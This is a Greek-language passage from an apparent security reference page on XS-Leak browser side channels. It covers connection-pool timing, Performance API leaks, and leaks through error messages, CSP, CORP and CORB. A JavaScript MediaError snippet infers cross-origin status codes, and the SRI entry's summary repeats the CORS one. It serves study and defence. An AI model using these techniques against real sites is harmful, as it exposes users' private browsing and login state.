- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
- **Περίληψη:** Ένας επιτιθέμενος θα μπορούσε να κλειδώσει όλα τα sockets εκτός από 1, να φορτώσει τον στόχο και ταυτόχρονα να φορτώσει μια άλλη σελίδα — ο χρόνος μέχρι η τελευταία σελίδα να αρχίσει να φορτώνει είναι ο χρόνος που χρειάστηκε η στοχευόμενη σελίδα για να φορτώσει.
- **Παράδειγμα Κώδικα**:


{{#ref}}
connection-pool-example.md
{{#endref}}

Οι browsers χρησιμοποιούν sockets για επικοινωνία με servers, αλλά λόγω ορίων πόρων του λειτουργικού και του hardware, **οι browsers αναγκαστικά θέτουν όριο** στον αριθμό των ταυτόχρονων sockets. Οι επιτιθέμενοι μπορούν να εκμεταλλευτούν αυτόν τον περιορισμό με τα παρακάτω βήματα:

1. Προσδιορίστε το όριο sockets του browser, για παράδειγμα 256 global sockets.
2. Κατοχυρώστε 255 sockets για παρατεταμένη διάρκεια ξεκινώντας 255 αιτήματα σε διάφορους hosts, σχεδιασμένα να κρατούν τις συνδέσεις ανοιχτές χωρίς να ολοκληρωθούν.
3. Χρησιμοποιήστε το 256ο socket για να στείλετε ένα αίτημα στη στοχευόμενη σελίδα.
4. Προσπαθήστε ένα 257ο αίτημα σε διαφορετικό host. Δεδομένου ότι όλα τα sockets είναι σε χρήση (όπως στα βήματα 2 και 3), αυτό το αίτημα θα τοποθετηθεί σε ουρά μέχρι να γίνει διαθέσιμο κάποιο socket. Η καθυστέρηση πριν προχωρήσει αυτό το αίτημα παρέχει στον επιτιθέμενο πληροφορίες χρονομέτρησης για τη δραστηριότητα δικτύου που σχετίζεται με το 256ο socket (το socket της στοχευόμενης σελίδας). Αυτό το συμπέρασμα είναι δυνατό επειδή τα 255 sockets από το βήμα 2 εξακολουθούν να είναι κατειλημμένα, υπονοώντας ότι οποιοδήποτε νέο διαθέσιμο socket πρέπει να είναι αυτό που απελευθερώθηκε από το βήμα 3. Ο χρόνος που χρειάζεται για να γίνει διαθέσιμο το 256ο socket σχετίζεται άμεσα με τον χρόνο που απαιτείται για να ολοκληρωθεί το αίτημα στη στοχευόμενη σελίδα.

Για περισσότερες πληροφορίες: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Connection Pool by Destination

- **Μέθοδοι Ενσωμάτωσης**: JavaScript Requests
- **Ανιχνεύσιμη Διαφορά**: Timing (γενικά λόγω Page Content, Status Code)
- **Περισσότερες πληροφορίες**:
- **Περίληψη:** Είναι σαν την προηγούμενη τεχνική αλλά αντί να χρησιμοποιήσουμε όλα τα sockets, ο Google **Chrome** θέτει όριο **6 ταυτόχρονων αιτημάτων προς το ίδιο origin**. Αν **μπλοκάρουμε 5** και μετά **ξεκινήσουμε το 6ο** αίτημα μπορούμε να το **χρονομετρήσουμε** και αν καταφέρουμε να κάνουμε τη **σελίδα-θύμα να στείλει** περισσότερα **αιτήματα** προς το ίδιο endpoint για να ανιχνεύσουμε μια **κατάσταση** της **σελίδας**, το **6ο αίτημα** θα πάρει **περισσότερο χρόνο** και μπορούμε να το ανιχνεύσουμε.

## Performance API Techniques

Το [`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) προσφέρει πληροφορίες για τους μετρικούς επιδόσεων των web εφαρμογών, ενισχυμένο από το [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API). Το Resource Timing API επιτρέπει την παρακολούθηση αναλυτικών χρονισμών δικτύου για αιτήματα, όπως η διάρκεια των αιτημάτων. Σημειωτέον, όταν οι servers περιλαμβάνουν το header `Timing-Allow-Origin: *` στις απαντήσεις τους, περισσότερα δεδομένα όπως το transfer size και ο χρόνος domain lookup γίνονται διαθέσιμα.

Αυτά τα δεδομένα μπορούν να ανακτηθούν μέσω μεθόδων όπως `performance.getEntries` ή `performance.getEntriesByName`, παρέχοντας μια ολοκληρωμένη εικόνα των πληροφοριών απόδοσης. Επιπλέον, το API διευκολύνει τη μέτρηση χρόνων εκτέλεσης υπολογίζοντας τη διαφορά μεταξύ χρονικών στιγμών που λαμβάνονται από το [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). Ωστόσο, αξίζει να σημειωθεί ότι για ορισμένες λειτουργίες σε browsers όπως ο Chrome, η ακρίβεια του `performance.now()` μπορεί να περιορίζεται στα milliseconds, κάτι που μπορεί να επηρεάσει την ευκρίνεια των μετρήσεων χρονισμού.

Πέραν των μετρήσεων χρονισμού, το Performance API μπορεί να αξιοποιηθεί για πληροφορίες σχετικές με ασφάλεια. Για παράδειγμα, η παρουσία ή η απουσία σελίδων στο αντικείμενο `performance` στον Chrome μπορεί να υποδεικνύει την εφαρμογή του `X-Frame-Options`. Συγκεκριμένα, αν μια σελίδα εμποδίζεται από το να αποδοθεί σε frame λόγω `X-Frame-Options`, δεν θα καταγραφεί στο αντικείμενο `performance`, παρέχοντας μια λεπτή ένδειξη για την πολιτική framing της σελίδας.

### Error Leak

- **Μέθοδοι Ενσωμάτωσης**: Frames, HTML Elements
- **Ανιχνεύσιμη Διαφορά**: Status Code
- **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Περίληψη:** Ένα αίτημα που έχει ως αποτέλεσμα σφάλματα δεν δημιουργεί εγγραφή resource timing.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Είναι δυνατό να **διακρίνετε μεταξύ HTTP response status codes** επειδή αιτήματα που οδηγούν σε **σφάλμα** δεν δημιουργούν εγγραφή στο performance.

### Style Reload Error

- **Μέθοδοι Ενσωμάτωσης**: HTML Elements
- **Ανιχνεύσιμη Διαφορά**: Status Code
- **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Περίληψη:** Λόγω σφάλματος του browser, αιτήματα που αποτυγχάνουν φορτώνονται δύο φορές.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Στην προηγούμενη τεχνική εντοπίστηκαν δύο περιπτώσεις όπου σφάλματα του browser σε GC οδηγούσαν σε **φόρτωση πόρων δύο φορές όταν αποτύγχαναν να φορτώσουν**. Αυτό θα έχει ως αποτέλεσμα πολλαπλές εγγραφές στο Performance API και έτσι μπορεί να ανιχνευθεί.

### Request Merging Error

- **Μέθοδοι Ενσωμάτωσης**: HTML Elements
- **Ανιχνεύσιμη Διαφορά**: Status Code
- **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Περίληψη:** Αιτήματα που οδηγούν σε σφάλμα δεν μπορούν να συγχωνευτούν.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Η τεχνική βρέθηκε σε έναν πίνακα στο αναφερόμενο paper αλλά δεν βρέθηκε περιγραφή της τεχνικής σε αυτό. Ωστόσο, μπορείτε να βρείτε τον πηγαίο κώδικα που την ελέγχει στο [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Empty Page Leak

- **Μέθοδοι Ενσωμάτωσης**: Frames
- **Ανιχνεύσιμη Διαφορά**: Page Content
- **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Περίληψη:** Κενές απαντήσεις δεν δημιουργούν εγγραφές resource timing.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Ένας επιτιθέμενος μπορεί να ανιχνεύσει αν ένα αίτημα είχε ως αποτέλεσμα κενό HTTP response body επειδή **οι κενές σελίδες δεν δημιουργούν εγγραφή στο performance σε ορισμένους browsers**.

### **XSS-Auditor Leak**

- **Μέθοδοι Ενσωμάτωσης**: Frames
- **Ανιχνεύσιμη Διαφορά**: Page Content
- **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Περίληψη:** Χρησιμοποιώντας τον XSS Auditor σε Security Assertions, οι επιτιθέμενοι μπορούν να ανιχνεύσουν συγκεκριμένα στοιχεία σε μια ιστοσελίδα παρατηρώντας αλλαγές στις απαντήσεις όταν crafted payloads ενεργοποιούν τον μηχανισμό φιλτραρίσματος του auditor.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

Στις Security Assertions (SA), ο XSS Auditor, που αρχικά προοριζόταν να αποτρέψει Cross-Site Scripting (XSS) επιθέσεις, παραδόξως μπορεί να εκμεταλλευτεί για να διαρρεύσει ευαίσθητες πληροφορίες. Αν και αυτή η ενσωματωμένη λειτουργία αφαιρέθηκε από τον Google Chrome (GC), εξακολουθεί να υπάρχει σε SA. Το 2013, οι Braun και Heiderich έδειξαν ότι ο XSS Auditor μπορεί ακούσια να αποκλείει νόμιμα scripts, οδηγώντας σε false positives. Βασιζόμενοι σε αυτό, ερευνητές ανέπτυξαν τεχνικές για εξαγωγή πληροφοριών και ανίχνευση συγκεκριμένου περιεχομένου σε cross-origin σελίδες, μια έννοια γνωστή ως XS-Leaks, αρχικά αναφερθείσα από τον Terada και επεξηγημένη από τον Heyes σε ένα blog post. Αν και αυτές οι τεχνικές ήταν συγκεκριμένες για τον XSS Auditor σε GC, ανακαλύφθηκε ότι σε SA, σελίδες που αποκλείονται από τον XSS Auditor δεν δημιουργούν εγγραφές στο Performance API, αποκαλύπτοντας έναν τρόπο μέσω του οποίου ευαίσθητες πληροφορίες μπορεί ακόμη να διαρρεύσουν.

### X-Frame Leak

- **Μέθοδοι Ενσωμάτωσης**: Frames
- **Ανιχνεύσιμη Διαφορά**: Header
- **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
- **Περίληψη:** Πόρος με header X-Frame-Options δεν δημιουργεί εγγραφή resource timing.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Αν μια σελίδα **δεν επιτρέπεται** να **αποδοθεί** σε ένα **iframe** δεν δημιουργεί εγγραφή στο performance. Ως αποτέλεσμα, ένας επιτιθέμενος μπορεί να ανιχνεύσει το response header **`X-Frame-Options`**.\
Το ίδιο συμβαίνει αν χρησιμοποιήσετε ένα **embed** **tag.**

### Download Detection

- **Μέθοδοι Ενσωμάτωσης**: Frames
- **Ανιχνεύσιμη Διαφορά**: Header
- **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Περίληψη:** Οι λήψεις δεν δημιουργούν εγγραφές resource timing στο Performance API.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Παρόμοια με το περιγεγραμμένο XS-Leak, ένας **πόρος που κατεβαίνει** λόγω του header ContentDisposition, επίσης δεν δημιουργεί εγγραφή στο performance. Αυτή η τεχνική λειτουργεί σε όλους τους κύριους browsers.

### Redirect Start Leak

- **Μέθοδοι Ενσωμάτωσης**: Frames
- **Ανιχνεύσιμη Διαφορά**: Redirect
- **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Περίληψη:** Η εγγραφή resource timing διαρρέει την ώρα έναρξης ενός redirect.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Βρήκαμε ένα XS-Leak παράδειγμα που εκμεταλλεύεται τη συμπεριφορά ορισμένων browsers που καταγράφουν υπερβολικά πολλές πληροφορίες για cross-origin αιτήματα. Το πρότυπο ορίζει ένα υποσύνολο χαρακτηριστικών που πρέπει να μηδενίζονται για cross-origin πόρους. Ωστόσο, σε **SA** είναι δυνατό να ανιχνεύσετε αν ο χρήστης έχει **ανακατευθυνθεί** από τη στοχευόμενη σελίδα, ερωτώντας το **Performance API** και ελέγχοντας για τα δεδομένα **redirectStart timing**.

### Duration Redirect Leak

- **Μέθοδοι Ενσωμάτωσης**: Fetch API
- **Ανιχνεύσιμη Διαφορά**: Redirect
- **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Περίληψη:** Η διάρκεια των εγγραφών timing είναι αρνητική όταν συμβαίνει redirect.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

Σε GC, η **duration** για αιτήματα που καταλήγουν σε **redirect** είναι **αρνητική** και έτσι μπορεί να **διακριθεί** από αιτήματα που δεν οδηγούν σε redirect.

### CORP Leak

- **Μέθοδοι Ενσωμάτωσης**: Frames
- **Ανιχνεύσιμη Διαφορά**: Header
- **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Περίληψη:** Πόρος προστατευμένος με CORP δεν δημιουργεί εγγραφές resource timing.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

Σε ορισμένες περιπτώσεις, η εγγραφή **nextHopProtocol** μπορεί να χρησιμοποιηθεί ως τεχνική leak. Σε GC, όταν το header **CORP** είναι ρυθμισμένο, το nextHopProtocol θα είναι **κενό**. Σημειώστε ότι σε SA δεν δημιουργείται καθόλου εγγραφή performance για πόρους με CORP.

### Service Worker

- **Μέθοδοι Ενσωμάτωσης**: Frames
- **Ανιχνεύσιμη Διαφορά**: API Usage
- **Περισσότερες πληροφορίες**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
- **Περίληψη:** Ανίχνευση αν ένας service worker είναι καταχωρημένος για ένα συγκεκριμένο origin.
- **Παράδειγμα Κώδικα**:

Οι service workers είναι event-driven script contexts που τρέχουν σε ένα origin. Εκτελούνται στο παρασκήνιο μιας σελίδας και μπορούν να παρεμβαίνουν, να τροποποιούν και να **cacheάρουν resources** για να δημιουργήσουν offline web εφαρμογές.\
Αν ένας **πόρος cacheαρισμένος** από έναν **service worker** προσεγγιστεί μέσω **iframe**, ο πόρος θα φορτωθεί **από το cache του service worker**.\
Για να ανιχνεύσετε αν ο πόρος φορτώθηκε **από το service worker** cache μπορείτε να χρησιμοποιήσετε το **Performance API**.\
Αυτό θα μπορούσε επίσης να γίνει με μια Timing επίθεση (δείτε το paper για περισσότερες πληροφορίες).

### Cache

- **Μέθοδοι Ενσωμάτωσης**: Fetch API
- **Ανιχνεύσιμη Διαφορά**: Timing
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
- **Περίληψη:** Είναι δυνατόν να ελεγχθεί αν ένας πόρος είναι αποθηκευμένος στην cache.
- **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](<https://xsinator.com/testing.html#Cache%20Leak%20(POST)>)

Χρησιμοποιώντας το [Performance API](#performance-api) είναι δυνατό να ελέγξετε αν ένας πόρος είναι cacheαρισμένος.

### Network Duration

- **Μέθοδοι Ενσωμάτωσης**: Fetch API
- **Ανιχνεύσιμη Διαφορά**: Page Content
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
- **Περίληψη:** Είναι δυνατό να ανακτηθεί η διάρκεια δικτύου ενός αιτήματος από το `performance` API.
- **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Error Messages Technique

### Media Error

- **Μέθοδοι Ενσωμάτωσης**: HTML Elements (Video, Audio)
- **Ανιχνεύσιμη Διαφορά**: Status Code
- **Περισσότερες πληροφορίες**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
- **Περίληψη:** Στον Firefox είναι δυνατό να διαρρεύσει με ακρίβεια ο status code ενός cross-origin αιτήματος.
- **Παράδειγμα Κώδικα**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false)
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg
}

function startup() {
let audioElement = document.getElementById("audio")
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener(
"click",
function () {
audioElement.src = document.getElementById("testUrl").value
},
false
)
// Create the event handler
var errHandler = function () {
let err = this.error
let message = err.message
let status = ""

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if (
message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1 ||
message.indexOf("Failed to init decoder") != -1
) {
status = "Success"
} else {
status = "Error"
}
displayErrorMessage(
"<strong>Status: " +
status +
"</strong> (Error code:" +
err.code +
" / Error Message: " +
err.message +
")<br>"
)
}
audioElement.onerror = errHandler
}
```
The `MediaError` interface's `message` property ταυτοποιεί μοναδικά πόρους που φορτώνονται επιτυχώς με μία διακριτή συμβολοσειρά. Ένας επιτιθέμενος μπορεί να εκμεταλλευτεί αυτή τη δυνατότητα παρατηρώντας το περιεχόμενο του μηνύματος και συνεπώς να συμπεράνει την κατάσταση απάντησης ενός cross-origin resource.

### CORS Error

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Επικεφαλίδα
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Summary:** Στις Security Assertions (SA), τα CORS error μηνύματα εκθέτουν άθελά τους το πλήρες URL των ανακατευθυνόμενων αιτημάτων.
- **Code Example**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Αυτή η τεχνική επιτρέπει σε έναν επιτιθέμενο να εξάγει τον προορισμό του redirect ενός cross-origin site εκμεταλλευόμενος τον τρόπο που τα Webkit-based browsers διαχειρίζονται τις CORS αιτήσεις. Συγκεκριμένα, όταν ένα **CORS-enabled request** αποστέλλεται σε έναν στόχο που εκτελεί redirect με βάση την κατάσταση του χρήστη και ο browser στη συνέχεια αρνείται το request, το **πλήρες URL του στόχου του redirect** αποκαλύπτεται μέσα στο μήνυμα σφάλματος. Αυτή η ευπάθεια όχι μόνο αποκαλύπτει το γεγονός του redirect αλλά και το endpoint του redirect και τυχόν **ευαίσθητους query parameters** που μπορεί να περιέχει.

### SRI Error

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Επικεφαλίδα
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Summary:** Στις Security Assertions (SA), τα CORS error μηνύματα εκθέτουν άθελά τους το πλήρες URL των ανακατευθυνόμενων αιτημάτων.
- **Code Example**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Ένας επιτιθέμενος μπορεί να εκμεταλλευτεί **λεπτομερή μηνύματα σφάλματος** για να συμπεράνει το μέγεθος cross-origin responses. Αυτό είναι εφικτό λόγω του μηχανισμού του Subresource Integrity (SRI), που χρησιμοποιεί το attribute `integrity` για να επαληθεύει ότι πόροι που φορτώνονται (συχνά από CDNs) δεν έχουν τροποποιηθεί. Για να λειτουργήσει το SRI σε cross-origin πόρους, αυτοί πρέπει να είναι **CORS-enabled**· αλλιώς δεν ελέγχονται για integrity. Στις Security Assertions (SA), όπως και με το CORS error XS-Leak, ένα μήνυμα σφάλματος μπορεί να καταγραφεί αφού ένα fetch request με attribute `integrity` αποτύχει. Οι επιτιθέμενοι μπορούν σκόπιμα να **προκαλέσουν αυτό το σφάλμα** θέτοντας μια **ψευδή τιμή hash** στο attribute `integrity` οποιασδήποτε αίτησης. Στις SA, το προκύπτον μήνυμα σφάλματος αποκαλύπτει άθελά του το μήκος περιεχομένου (content length) του αιτούμενου πόρου. Αυτή η διαρροή πληροφορίας επιτρέπει σε έναν επιτιθέμενο να διακρίνει διαφορές στο μέγεθος της απόκρισης, ανοίγοντας το δρόμο για πιο σύνθετες XS-Leak επιθέσεις.

### CSP Violation/Detection

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Status Code
- **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
- **Summary:** Αν επιτρέψουμε μόνο τον ιστότοπο του θύματος στο CSP και όταν τον επισκεφτούμε αυτός προσπαθήσει να κάνει redirect σε διαφορετικό domain, το CSP θα προκαλέσει ένα ανιχνεύσιμο σφάλμα.
- **Code Example**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Ένα XS-Leak μπορεί να χρησιμοποιήσει το CSP για να ανιχνεύσει αν ένας cross-origin ιστότοπος ανακατευθύνθηκε σε διαφορετική origin. Αυτή η διαρροή μπορεί να ανιχνεύσει το redirect, αλλά επιπλέον διαρρέει και το domain του στόχου του redirect. Η βασική ιδέα της επίθεσης είναι να **επιτρέψουμε το target domain στην σελίδα του επιτιθέμενου**. Μόλις εκδοθεί ένα request προς το target domain, αυτό **ανακατευθύνει** σε ένα cross-origin domain. Το **CSP μπλοκάρει** την πρόσβαση σε αυτό και δημιουργεί μια **αναφορά παράβασης** που χρησιμοποιείται ως τεχνική leak. Ανάλογα με τον browser, **αυτή η αναφορά μπορεί να διαρρεύσει την τοποθεσία προορισμού του redirect**.\
Οι σύγχρονοι browsers δεν θα δείξουν το URL στο οποίο έγινε το redirect, αλλά μπορείτε ακόμα να ανιχνεύσετε ότι ενεργοποιήθηκε ένα cross-origin redirect.

### Cache

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
- **Summary:** Καθαρίστε το αρχείο από το cache. Ανοίγουμε τη σελίδα-στόχο και ελέγχουμε αν το αρχείο υπάρχει στο cache.
- **Code Example:**

Οι browsers μπορεί να χρησιμοποιούν κοινή cache για όλους τους ιστότοπους. Ανεξαρτήτως origin, είναι δυνατή η συμπερασματική εξαγωγή του αν μια σελίδα έχει **ζητήσει ένα συγκεκριμένο αρχείο**.

Αν μια σελίδα φορτώνει μια εικόνα μόνο όταν ο χρήστης είναι συνδεδεμένος, μπορείτε να **ακυρώσετε** τον **πόρο** (ώστε να μην είναι πλέον cached αν ήταν, δείτε τα links για περισσότερες πληροφορίες), **εκτελέσετε ένα request** που θα μπορούσε να φορτώσει αυτόν τον πόρο και να προσπαθήσετε να φορτώσετε τον πόρο **με ένα κακό request** (π.χ. χρησιμοποιώντας έναν υπερβολικά μακρύ referer header). Αν το φόρτωμα του πόρου **δεν προκάλεσε κανένα σφάλμα**, τότε αυτό συμβαίνει επειδή ήταν **cached**.

### CSP Directive

- **Inclusion Methods**: Frames
- **Detectable Difference**: Επικεφαλίδα
- **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
- **Summary:** Οι οδηγίες του CSP header μπορούν να εξερευνηθούν χρησιμοποιώντας το CSP iframe attribute, αποκαλύπτοντας λεπτομέρειες της πολιτικής.
- **Code Example**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Μια νέα δυνατότητα στον Google Chrome (GC) επιτρέπει στις ιστοσελίδες να **προτείνουν ένα Content Security Policy (CSP)** θέτοντας ένα attribute σε ένα στοιχείο iframe, με τις οδηγίες πολιτικής να μεταφέρονται μαζί με το HTTP request. Κανονικά, το ενσωματωμένο περιεχόμενο πρέπει να **εξουσιοδοτήσει αυτό μέσω ενός HTTP header**, αλλιώς **εμφανίζεται σελίδα σφάλματος**. Ωστόσο, αν το iframe ήδη διέπεται από ένα CSP και η νέα προτεινόμενη πολιτική δεν είναι πιο επιβαρυντική, η σελίδα θα φορτώσει κανονικά. Αυτός ο μηχανισμός ανοίγει ένα δρόμο για έναν επιτιθέμενο να **εντοπίσει συγκεκριμένες οδηγίες CSP** μιας cross-origin σελίδας αναγνωρίζοντας τη σελίδα σφάλματος. Παρότι αυτή η ευπάθεια θεωρήθηκε διορθωμένη, τα ευρήματά μας αποκαλύπτουν μια **νέα τεχνική leak** ικανή να εντοπίσει τη σελίδα σφάλματος, υποδεικνύοντας ότι το υποκείμενο πρόβλημα πιθανόν δεν επιλύθηκε πλήρως.

### **CORP**

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Επικεφαλίδα
- **More info**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
- **Summary:** Πόροι προστατευμένοι με Cross-Origin Resource Policy (CORP) θα ρίξουν σφάλμα όταν ζητηθούν από μη επιτρεπόμενο origin.
- **Code Example**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

Το header CORP είναι ένα σχετικά νέο χαρακτηριστικό ασφαλείας της web πλατφόρμας που όταν οριστεί **μπλοκάρει no-cors cross-origin requests προς τον δοθέντα πόρο**. Η παρουσία του header μπορεί να ανιχνευθεί, γιατί ένας πόρος προστατευμένος με CORP θα **προκαλέσει σφάλμα όταν ανακτηθεί (fetched)**.

### CORB

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Επικεφαλίδες
- **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
- **Summary**: Το CORB μπορεί να επιτρέψει σε επιτιθέμενους να εντοπίσουν πότε το header `nosniff` είναι παρόν στην αίτηση.
- **Code Example**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Δείτε το link για περισσότερες πληροφορίες σχετικά με την επίθεση.

### CORS error on Origin Reflection misconfiguration <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Επικεφαλίδες
- **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
- **Summary**: Αν το Origin header ανακλάται στην `Access-Control-Allow-Origin` επικεφαλίδα, είναι πιθανό να ελέγξουμε αν ένας πόρος είναι ήδη στην cache.
- **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

